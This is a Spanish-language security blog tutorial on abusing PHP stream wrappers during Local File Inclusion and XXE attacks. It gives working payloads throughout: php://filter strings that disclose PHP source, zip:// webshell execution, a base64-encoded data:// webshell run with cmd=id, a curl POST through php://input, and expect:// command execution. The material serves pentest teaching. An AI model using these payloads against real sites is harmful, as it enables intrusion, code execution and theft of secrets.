---
id: "explotacion-de-php-wrappers"
title: "Explotación de PHP Wrappers"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-02-04
updatedDate: 2022-02-04
image: "https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-0.webp"
description: "Guía completa sobre la explotación de PHP Wrappers en vulnerabilidades web, incluyendo técnicas con php://filter, zip://, data://, php://input y expect:// para LFI y XXE."
categories:
  - "web"
draft: false
featured: false
lang: "es"
---

En el caso de que tratemos con archivos PHP, existe un concepto que son los llamados PHP Wrappers. Un wrapper es una especie de envoltura que le dice al Stream (secuencia, petición, entrada/salida de datos) como actuar.

Esta característica de PHP es muy útil en ataques como el LFI y el XXE, gracias a esto, podemos obtener alguna que otra ventaja que de otra forma no tendríamos.

El concepto de wrapper quedará más claro cuando lo veamos ahora.

Índice:

- [php://filter](#phpfilter)
- [zip://](#zip)
- [data://](#data)
- [php://input](#phpinput)
- [expect://](#expect)
- [Referencias](#referencias)

## php://filter

El Wrapper filter nos permite encodear el archivo que le especifiquemos, esto es muy útil, ya que nos permite poder leer archivos PHP que en otro caso, el navegador simplemente interpretaría directamente.

Por ejemplo, tenemos el siguiente archivo:

![Código PHP de archivo secret.php con contraseña en comentario](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-1.avif)

Como vemos, tiene una contraseña en un comentario. Pero si nosotros accedemos al archivo desde la web:

![Navegador mostrando solo la salida del código PHP interpretado](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-2.avif)

Solo vemos la salida del código interpretado 😥. Sin embargo, usando el wrapper filter, seremos capaces de leer el archivo PHP al completo.

Para probar el wrapper, he creado un LFI en un archivo index.php. Por lo que, en este LFI, el payload que introduciremos para hacer uso del wrapper y leer el archivo secret.php, será el siguiente:

```text
php://filter/convert.base64-encode/resource=<archivo>
```

![Uso de php://filter para obtener archivo PHP codificado en base64](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-3.avif)

De esta forma, estamos leyendo el archivo secret.php pero en base64, por lo que si decodeamos esta salida:

![Decodificación de base64 revelando el código PHP completo con contraseña](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-4.avif)

Obtenemos el archivo al completo. Un detalle curioso sobre los wrappers es que podemos concatenar varios a través del uso de un `pipe |` o un `slash /`. Ejemplo:

![Concatenación de wrappers usando pipe y slash](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-5.avif)

![Resultado idéntico al concatenar múltiples wrappers](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-6.avif)

Y obtenemos exactamente el mismo resultado.

Además de poder encodear en base64, podemos aplicar ROT13 con la siguiente cadena:

```text
php://filter/read=string.rot13/resource=<archivo>
```

Aunque este en concreto no sirve para leer archivos PHP:

![Wrapper ROT13 no funciona para leer archivos PHP](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-7.avif)

Pero si aplica para otro tipo de archivos:

![Wrapper ROT13 funcionando correctamente con archivos de texto](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-8.avif)

En conclusión, referente a este wrapper, tenemos los dos siguientes payloads:

```text
php://filter/convert.base64-encode/resource=<archivo>
php://filter/read=string.rot13/resource=<archivo>
```

## zip://

El wrapper zip nos permite ejecutar un php que hayamos metido dentro de un archivo zip. Incluso no hace falta que el archivo zip tenga como extensión zip, sino que puede tener cualquiera.

Este wrapper no está instalado por defecto, pero se puede instalar con el siguiente comando:

```bash
sudo apt install phpX.Y-zip
```

Donde X e Y, es la versión PHP que tengamos instalada o a la que queramos instalarle esta característica.

Ejemplo de ejecución de webshell a través de este wrapper:

![Ejecución de comando usando wrapper zip con webshell](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-9.avif)

Payload:

```text
zip://<archivo zip>%23<archivo php>
```

En <archivo zip>, si no se encontrase en el directorio actual, se le especificaría el directorio donde se encontrase el archivo y listo.

> Nota: en caso de que el archivo PHP fuese una webshell o esperase algún parámetro, se le agregaría con un ampersand como vemos en la siguiente imagen.

![Uso de ampersand para pasar parámetros al wrapper zip](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-10.avif)

E incluso cambiando la extensión del zip, seguirá funcionando:

![Archivo ZIP renombrado con extensión jpg](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-11.avif)

![Wrapper zip funcionando con archivo renombrado como jpg](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-12.avif)

## data://

El wrapper data nos permite incluir datos externos, incluido código PHP. Este wrapper solo funciona si la opción allow_url_include está activada en la configuración de PHP (la opción equivalente a un Remote File Inclusion).

Ejecutar código PHP con este wrapper es bastante sencillo, podemos hacerlo de dos formas:

- En texto plano
- En base 64

En texto plano, simplemente tendríamos que usar el siguiente payload:

```text
data:text/plain,<código PHP>
```

Ejemplo:

![Ejecución de código PHP en texto plano usando wrapper data](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-13.avif)

De cara a hacerlo usando base64, simplemente tendríamos que encodear el código PHP:

![Codificación de código PHP en base64](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-14.avif)

Y colocarlo en el wrapper tal que:

```text
data://text/plain;base64,<código PHP en base64>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=
```

De esta forma, como estamos definiendo un parámetro para ejecutar comandos, el payload para por ejemplo ejecutar el comando id sería:

```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
```

Ejemplo:

![Ejecución del comando id usando wrapper data con base64](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-15.avif)

## php://input

Este wrapper es parecido al de arriba (data). Se puede usar para incluir código PHP. Su requisito al igual que el wrapper data es que la opción allow\_url\_include de la configuración de PHP debe de estar habilitada.

Con esto hecho, se podría ejecutar comandos mandando el código PHP en los datos de una petición POST. Ejemplo:

```bash
curl -s -X POST -d '<código PHP>' 'http://example.com/index.php?file=php://input'
```

![Ejecución de comando usando wrapper php://input con petición POST](https://cdn.deephacking.tech/i/posts/explotacion-de-php-wrappers/explotacion-de-php-wrappers-16.avif)

En este caso, la salida del comando la podemos ver en la respuesta.

## expect://

El wrapper expect no está instalado por defecto, pero en el caso de que lo esté, permite ejecutar directamente comandos de la siguiente forma:

```text
expect://<comando>
```

Esto ocurre porque este wrapper da acceso a una PTY (pseudo-teletype), que en UNIX básicamente se refiere a una terminal. Da acceso tanto al STDIN, STDOUT como STDERR.

## Conclusión PHP Wrappers

Como hemos podido ver, esta característica de PHP es muy útil en muchas ocasiones, ya que nos puede ayudar conseguir acciones que de una u otra forma no podríamos. Es bastante útil hacer uso de ellas cuando estamos ante vulnerabilidades como el Local File Inclusion (LFI) o el XML External Entity (XXE), o realmente en cualquier caso donde veamos que tenemos la capacidad de usarlas.

## Referencias

- [Explicación sobre PTY y TTY en StackOverflow](https://stackoverflow.com/questions/4426280/what-do-pty-and-tty-mean)
- [Documentación oficial del wrapper expect en PHP](https://www.php.net/manual/en/wrappers.expect.php)
- [Guía de File Inclusion y Directory Traversal en HackTheBox Academy](https://academy.hackthebox.com/)
